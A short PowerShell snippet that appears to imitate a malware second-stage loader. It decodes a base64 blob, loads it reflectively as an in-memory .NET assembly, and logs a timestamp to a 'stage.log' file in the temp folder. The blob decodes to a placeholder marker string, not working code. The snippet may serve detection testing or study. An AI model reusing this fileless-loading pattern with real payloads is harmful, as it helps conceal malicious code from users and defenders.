
$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpzM2wxcTFpdW5u'); [Reflection.Assembly]::Load($AssemblyBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
